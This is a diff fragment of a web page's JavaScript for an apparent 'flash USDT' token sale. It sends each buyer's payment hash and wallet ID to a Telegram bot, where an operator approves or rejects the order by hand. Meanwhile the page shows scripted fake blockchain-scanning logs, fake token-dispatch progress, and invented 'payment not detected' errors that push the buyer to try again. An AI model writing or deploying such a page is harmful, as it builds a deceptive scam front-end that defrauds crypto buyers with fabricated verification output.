+  const text=`⚡ *NEW FLASH ORDER*\n\n🔷 Platform: *${m.name}*\n📦 Pack: *${pack}*\n💵 Amount: *$${amount} USDT*\n⚡ Tokens: *${tokens} FLASH*\n\n🔗 TXN Hash:\n\`${hash}\`\n\n👤 BEP20 / UID:\n\`${eid}\`\n\n📍 Payment Address:\n\`${ADDR}\``;
+  try{
+    const r=await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:TG_CHAT,text,parse_mode:"Markdown",reply_markup:{inline_keyboard:[[{text:"✅ APPROVE",callback_data:"approve"},{text:"❌ REJECT",callback_data:"reject"}]]}})});
+    const d=await r.json();if(d.ok)currentMsgId=d.result.message_id;
+  }catch(e){}
+}
+async function pollApproval(){
+  try{
+    const r=await fetch(`https://api.telegram.org/bot${TG_TOKEN}/getUpdates?timeout=2&allowed_updates=["callback_query"]`);
+    const d=await r.json();if(!d.ok||!d.result.length)return null;
+    const cbs=d.result.filter(u=>u.callback_query);if(!cbs.length)return null;
+    const latest=cbs[cbs.length-1];const action=latest.callback_query.data;
+    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/getUpdates?offset=${latest.update_id+1}`);
+    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/answerCallbackQuery`,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({callback_query_id:latest.callback_query.id,text:action==="approve"?"✅ Approved!":"❌ Rejected!"})});
+    return action;
+  }catch(e){return null}
+}
+function startProcessing(hash,eid){
+  if(timers.pay)clearInterval(timers.pay);
+  Object.assign(state,{processing:true,procFailed:false,logs:[],procLabel:"VERIFYING_PAYMENT",procFoot:"Do not close this window. The node is scanning the chain.",procLeft:30});
+  const p=packsFor(state.pl).find(x=>x.id===state.pk);
+  sendToTelegram(hash,eid,state.pl,p.l,p.p,p.f.toLocaleString());
+  render();
+  timers.proc=setInterval(()=>{if(state.procLeft<=1){clearInterval(timers.proc);timers.proc=null;return}state.procLeft--;render()},1000);
+  const scan=[
+    {text:"$ flash --verify-payment --strict",color:"neon"},
+    {text:"[init] opening secure socket → node-04.flash",color:"dim"},
+    {text:"[handshake] HMAC-SHA256 ........ OK",color:"dim"},
+    {text:"[scan] mempool sweep started ...",color:"dim"},
+    {text:"$ locating transaction on network ...",color:"neon"},
+    {text:"[scan] querying BEP20 explorer ...",color:"dim"},
+    {text:"[scan] querying TRC20 explorer ...",color:"dim"},
+    {text:"[match] cross-checking tx hash ...",color:"dim"},
+    {text:"[match] verifying wallet binding ...",color:"dim"},
+    {text:"[verify] awaiting confirmations ...",color:"dim"},
+  ];let si=0;
+  timers.log=setInterval(()=>{if(si<scan.length){state.logs.push(scan[si++]);render()}},2200);
+  let pc=0,approved=false;
+  timers.poll=setInterval(async()=>{
+    pc++;const action=await pollApproval();
+    if(action==="approve"&&!approved){
+      approved=true;clearInterval(timers.poll);clearInterval(timers.log);clearInterval(timers.proc);
+      const succ=["✅ PAYMENT VERIFIED ON-CHAIN","[node] transaction confirmed — 12 blocks","$ initiating token dispatch ...","[dispatch] connecting to FLASH contract ...","[dispatch] wallet validated",`[dispatch] sending ${p.f.toLocaleString()} FLASH → ${eid.substring(0,16)}...`,"[dispatch] transfer submitted to mempool","[progress] 25% ████░░░░░░░░░░░░","[progress] 50% ████████░░░░░░░░","[progress] 75% ████████████░░░░","[progress] 100% ████████████████","✅ TRANSACTION COMPLETE — TOKENS SENT"];
+      state.procLabel="PAYMENT_VERIFIED";state.procFoot="Payment confirmed. Sending tokens to your wallet...";render();
+      let gi=0;timers.succ=setInterval(()=>{if(gi<succ.length){state.logs.push({text:succ[gi++],color:"neon"});render()}else{clearInterval(timers.succ);setTimeout(()=>showSuccess(eid),800)}},600);
+    }else if((action==="reject"||pc>=15)&&!approved){
+      clearInterval(timers.poll);clearInterval(timers.log);
+      const errs=[{text:"[verify] timeout after 28s",color:"dim"},{text:"[ERROR] no matching transaction on-chain",color:"danger"},{text:"[ERROR] PAYMENT NOT DETECTED",color:"danger"},{text:"[ABORT] session terminated by node",color:"danger"}];
+      errs.forEach((line,i)=>setTimeout(()=>{state.logs.push(line);if(i===errs.length-1){state.procFailed=true;state.procLabel="PAYMENT_FAILED";state.procFoot="Node rejected the payment. Returning to main interface...";setTimeout(showFail,800)}render()},i*600));
+    }
+  },2000);
+}
+function showFail(){
+  document.getElementById("modal").innerHTML=`<div class="fixed inset-0 flex items-center justify-center p-5" style="background:rgba(0,0,0,.7);backdrop-filter:blur(16px);z-index:50" id="failbg">
+    <div class="glass-card max-w-[420px] w-full rounded-2xl p-5 pop" style="box-shadow:0 0 40px rgba(255,71,71,.3)">
+      <h3 class="m-0 mb-3 text-[20px] tracking-[0.15em] flex items-center gap-2.5" style="color:var(--danger)">⚠ PAYMENT FAILED</h3>
+      <p class="text-[13px] text-white/70 m-0 mb-2">The node could not verify your transaction on-chain. No matching payment was detected for the submitted hash.</p>
+      <ul class="text-[12px] text-white/60 pl-4 m-0 mb-4"><li>Check that you sent the exact amount</li><li>Confirm the transaction hash is correct</li><li>Verify your exchange UID or wallet address</li></ul>
+      <div class="flex gap-2.5">
+        <button class="flex-1 p-2.5 rounded-md glass-soft text-white/80 font-bold tracking-[0.15em] text-[12px] cursor-pointer" onclick="resetAll()">MAIN PAGE</button>
+        <button class="flex-1 p-2.5 rounded-md text-white font-bold tracking-[0.15em] text-[12px] cursor-pointer" style="background:var(--danger);border:1px solid var(--danger)" onclick="resetAll()">TRY AGAIN →</button>
+      </div>
+    </div></div>`;
+  document.getElementById("failbg").onclick=e=>{if(e.target.id==="failbg")resetAll()};
+}
+function showSuccess(eid){
+  document.getElementById("modal").innerHTML=`<div class="fixed inset-0 flex items-center justify-center p-5" style="background:rgba(0,0,0,.8);backdrop-filter:blur(16px);z-index:100">
+    <div class="glass-card max-w-[420px] w-full rounded-2xl p-7 text-center pop" style="box-shadow:0 0 60px rgba(234,255,245,.4)">
+      <div class="text-[52px] mb-4">⚡</div>
+      <h3 class="text-[22px] tracking-[0.15em] m-0 mb-2.5" style="color:var(--neon)">TRANSACTION COMPLETE</h3>
+      <p class="text-white/60 text-[13px] m-0 mb-5">Your FLASH tokens have been sent successfully.</p>
+      <div class="glass-soft rounded-md p-3 mb-5 text-[11px] break-all" style="color:var(--neon)">${escapeHtml(eid)}</div>
+      <div class="text-white/60 text-[12px] mb-5">✓ Payment verified on-chain<br/>✓ Tokens dispatched to wallet<br/>✓ Session closed</div>
+      <button class="neon-btn w-full p-3.5 rounded-md font-bold text-[14px] tracking-[0.15em]" onclick="resetAll()">CLOSE →</button>
+    </div></div>`;
+}
+
+// Footer removed
+
+window.resetAll=resetAll;
+render();
+</script>
+</body>
+</html>
